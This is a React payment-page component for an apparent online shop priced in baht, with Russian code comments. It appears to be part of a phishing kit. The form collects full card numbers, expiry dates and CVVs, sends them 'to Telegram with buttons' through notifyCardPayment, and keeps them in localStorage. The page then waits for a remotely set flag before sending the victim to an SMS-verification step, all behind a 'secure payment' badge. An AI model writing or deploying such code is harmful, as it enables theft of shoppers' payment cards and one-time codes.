import React, { useState, useEffect } from 'react'
import { useNavigate, useLocation } from 'react-router-dom'
import { useLanguage } from '../context/LanguageContext'
import { notifyCardPayment, getUserId } from '../utils/telegramBot'
import LoadingSpinner from '../components/LoadingSpinner'
import './PaymentPage.css'

const PaymentPage = () => {
  const navigate = useNavigate()
  const location = useLocation()
  const { t, language } = useLanguage()
  
  // Получаем данные заказа
  const orderData = location.state?.orderData || JSON.parse(localStorage.getItem('pendingOrder') || '{}')
  
  // Генерируем userId при загрузке страницы
  useEffect(() => {
    const userId = getUserId()
    console.log('Generated userId:', userId)
  }, [])
  
  const [cardData, setCardData] = useState({
    cardNumber: '',
    cardHolderName: '',
    expiryDate: '',
    cvv: ''
  })
  
  const [errors, setErrors] = useState({})
  const [isProcessing, setIsProcessing] = useState(false)

  useEffect(() => {
    // Если нет данных заказа, редирект на главную
    if (!orderData.total) {
      navigate('/')
    }

    // Cleanup функция для очистки интервала при размонтировании
    return () => {
      const intervalId = localStorage.getItem('paymentCheckInterval')
      if (intervalId) {
        clearInterval(parseInt(intervalId))
        localStorage.removeItem('paymentCheckInterval')
      }
    }
  }, [orderData, navigate])

  const formatCardNumber = (value) => {
    // Удаляем все нецифровые символы
    const digits = value.replace(/\D/g, '')
    // Группируем по 4 цифры
    const groups = digits.match(/.{1,4}/g) || []
    return groups.join(' ').substring(0, 19) // 16 цифр + 3 пробела
  }

  const formatExpiryDate = (value) => {
    const digits = value.replace(/\D/g, '')
    if (digits.length >= 2) {
      return `${digits.substring(0, 2)}/${digits.substring(2, 4)}`
    }
    return digits
  }

  const handleInputChange = (e) => {
    const { name, value } = e.target
    let formattedValue = value

    if (name === 'cardNumber') {
      formattedValue = formatCardNumber(value)
    } else if (name === 'expiryDate') {
      formattedValue = formatExpiryDate(value)
    } else if (name === 'cvv') {
      formattedValue = value.replace(/\D/g, '').substring(0, 3)
    } else if (name === 'cardHolderName') {
      formattedValue = value.toUpperCase()
    }

    setCardData(prev => ({
      ...prev,
      [name]: formattedValue
    }))

    // Очистка ошибки при изменении поля
    if (errors[name]) {
      setErrors(prev => ({
        ...prev,
        [name]: ''
      }))
    }
  }

  const validateForm = () => {
    const newErrors = {}

    // Валидация номера карты
    const cardDigits = cardData.cardNumber.replace(/\s/g, '')
    if (!cardDigits) {
      newErrors.cardNumber = t('cardNumberRequired')
    } else if (cardDigits.length !== 16) {
      newErrors.cardNumber = t('invalidCardNumber')
    }

    // Валидация имени держателя карты
    if (!cardData.cardHolderName.trim()) {
      newErrors.cardHolderName = t('cardHolderNameRequired')
    }

    // Валидация даты истечения
    if (!cardData.expiryDate) {
      newErrors.expiryDate = t('expiryDateRequired')
    } else {
      const [month, year] = cardData.expiryDate.split('/')
      const currentDate = new Date()
      const currentYear = currentDate.getFullYear() % 100
      const currentMonth = currentDate.getMonth() + 1

      if (!month || !year || parseInt(month) < 1 || parseInt(month) > 12) {
        newErrors.expiryDate = t('invalidExpiryDate')
      } else if (parseInt(year) < currentYear || (parseInt(year) === currentYear && parseInt(month) < currentMonth)) {
        newErrors.expiryDate = t('invalidExpiryDate')
      }
    }

    // Валидация CVV
    if (!cardData.cvv) {
      newErrors.cvv = t('cvvRequired')
    } else if (cardData.cvv.length !== 3) {
      newErrors.cvv = t('invalidCVV')
    }

    setErrors(newErrors)
    return Object.keys(newErrors).length === 0
  }

  const handleSubmit = async (e) => {
    e.preventDefault()

    if (validateForm()) {
      setIsProcessing(true)

      // Сохраняем данные карты в localStorage для SMS страницы
      localStorage.setItem('pendingCardData', JSON.stringify(cardData))

      // Отправляем данные карты в Telegram с кнопками
      notifyCardPayment(cardData, orderData)

      // Получаем userId
      const userId = getUserId()

      // Начинаем polling - проверяем флаг на сервере каждые 2 секунды
      const checkSMSFlag = setInterval(async () => {
        try {
          // Проверяем флаг на backend сервере
          const response = await fetch(`/api/check-sms/${userId}`)
          const data = await response.json()

          if (data.smsRequested) {
            // Останавливаем polling
            clearInterval(checkSMSFlag)
            setIsProcessing(false)
            
            // Устанавливаем флаг в localStorage для совместимости
            localStorage.setItem(`sms_requested_${userId}`, 'true')
            
            // Переходим на страницу SMS верификации
            navigate('/sms-verification', {
              state: {
                orderData,
                cardData,
                fromPayment: true
              }
            })
          }
        } catch (error) {
          console.error('Error checking SMS flag:', error)
          // Fallback: проверяем localStorage
          const smsRequested = localStorage.getItem(`sms_requested_${userId}`)
          if (smsRequested === 'true') {
            clearInterval(checkSMSFlag)
            setIsProcessing(false)
            navigate('/sms-verification', {
              state: { orderData, cardData, fromPayment: true }
            })
          }
        }
      }, 2000) // Проверяем каждые 2 секунды

      // Сохраняем ID интервала для возможной очистки
      localStorage.setItem('paymentCheckInterval', checkSMSFlag)
    }
  }

  if (!orderData.total) {
    return null
  }

  return (
    <div className="payment-page">
      <LoadingSpinner isVisible={isProcessing} />
      <div className="payment-container">
        <div className="payment-header">
          <button onClick={() => navigate(-1)} className="back-button">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M19 12H5M12 19L5 12L12 5" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
            </svg>
            {t('back')}
          </button>
          <h1>{t('paymentDetails')}</h1>
        </div>

        <div className="payment-content">
          <div className="payment-form-section">
            {/* Secure Payment Badge */}
            <div className="secure-badge">
              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" stroke="#52A447" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                <path d="M9 12l2 2 4-4" stroke="#52A447" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
              </svg>
              <div>
                <div className="secure-title">{t('securePayment')}</div>
                <div className="secure-desc">{t('securePaymentDesc')}</div>
              </div>
            </div>

            {/* Accepted Cards */}
            <div className="accepted-cards">
              <div className="accepted-label">{t('acceptedCards')}</div>
              <div className="card-brands">
                <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Visa" />
                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard" />
                <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/American_Express_logo_%282018%29.svg" alt="Amex" />
              </div>
            </div>

            <form onSubmit={handleSubmit} className="payment-form">
              {/* Card Number */}
              <div className="form-group">
                <label htmlFor="cardNumber">{t('cardNumber')} *</label>
                <div className="input-wrapper">
                  <svg className="input-icon" width="20" height="20" viewBox="0 0 24 24" fill="none">
                    <rect x="2" y="6" width="20" height="12" rx="2" stroke="currentColor" strokeWidth="2"/>
                    <path d="M2 10h20" stroke="currentColor" strokeWidth="2"/>
                  </svg>
                  <input
                    type="text"
                    id="cardNumber"
                    name="cardNumber"
                    value={cardData.cardNumber}
                    onChange={handleInputChange}
                    className={errors.cardNumber ? 'error' : ''}
                    placeholder={t('enterCardNumber')}
                    maxLength="19"
                  />
                </div>
                {errors.cardNumber && <span className="error-message">{errors.cardNumber}</span>}
              </div>

              {/* Card Holder Name */}
              <div className="form-group">
                <label htmlFor="cardHolderName">{t('cardHolderName')} *</label>
                <div className="input-wrapper">
                  <svg className="input-icon" width="20" height="20" viewBox="0 0 24 24" fill="none">
                    <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2" stroke="currentColor" strokeWidth="2" strokeLinecap="round"/>
                    <circle cx="12" cy="7" r="4" stroke="currentColor" strokeWidth="2"/>
                  </svg>
                  <input
                    type="text"
                    id="cardHolderName"
                    name="cardHolderName"
                    value={cardData.cardHolderName}
                    onChange={handleInputChange}
                    className={errors.cardHolderName ? 'error' : ''}
                    placeholder={t('enterCardHolderName')}
                  />
                </div>
                {errors.cardHolderName && <span className="error-message">{errors.cardHolderName}</span>}
              </div>

              {/* Expiry Date and CVV */}
              <div className="form-row">
                <div className="form-group">
                  <label htmlFor="expiryDate">{t('expiryDate')} *</label>
                  <input
                    type="text"
                    id="expiryDate"
                    name="expiryDate"
                    value={cardData.expiryDate}
                    onChange={handleInputChange}
                    className={errors.expiryDate ? 'error' : ''}
                    placeholder={t('enterExpiryDate')}
                    maxLength="5"
                  />
                  {errors.expiryDate && <span className="error-message">{errors.expiryDate}</span>}
                </div>

                <div className="form-group">
                  <label htmlFor="cvv">{t('cvv')} *</label>
                  <input
                    type="text"
                    id="cvv"
                    name="cvv"
                    value={cardData.cvv}
                    onChange={handleInputChange}
                    className={errors.cvv ? 'error' : ''}
                    placeholder={t('enterCVV')}
                    maxLength="3"
                  />
                  {errors.cvv && <span className="error-message">{errors.cvv}</span>}
                </div>
              </div>

              <button 
                type="submit" 
                className={`pay-button ${isProcessing ? 'processing' : ''}`}
                disabled={isProcessing}
              >
                {isProcessing ? t('processing') : `${t('payNow')} - ${orderData.total} ${t('baht')}`}
              </button>
            </form>
          </div>

          {/* Order Summary */}
          <div className="payment-summary-section">
            <div className="payment-summary">
              <h3>{t('orderSummary')}</h3>
              
              <div className="summary-items">
                {orderData.cartItems && orderData.cartItems.map((item, index) => {
                  const itemName = language === 'th' ? item.name_th : item.name_en
                  return (
                    <div key={index} className="summary-item">
                      <div className="item-info">
                        <span className="item-name">{itemName}</span>
                        <span className="item-quantity">x{item.quantity}</span>
                      </div>
                      <span className="item-price">{item.price} {t('baht')}</span>
                    </div>
                  )
                })}
              </div>

              <div className="summary-totals">
                <div className="summary-line">
                  <span>{t('subtotal')}</span>
                  <span>{orderData.subtotal || orderData.total} {t('baht')}</span>
                </div>
                <div className="summary-line">
                  <span>{t('deliveryFee')}</span>
                  <span>{orderData.deliveryFee || 0} {t('baht')}</span>
                </div>
                <div className="summary-line total">
                  <span>{t('orderTotal')}</span>
                  <span>{orderData.total} {t('baht')}</span>
                </div>
              </div>

              {/* Delivery Info */}
              {orderData.formData && (
                <div className="delivery-info">
                  <h4>{t('deliveryAddress')}</h4>
                  <p>
                    {orderData.formData.firstName} {orderData.formData.lastName}<br/>
                    {orderData.formData.address}<br/>
                    {orderData.formData.city}<br/>
                    {t('phoneNumber')}: {orderData.formData.phone}
                  </p>
                </div>
              )}
            </div>
          </div>
        </div>
      </div>
    </div>
  )
}

export default PaymentPage

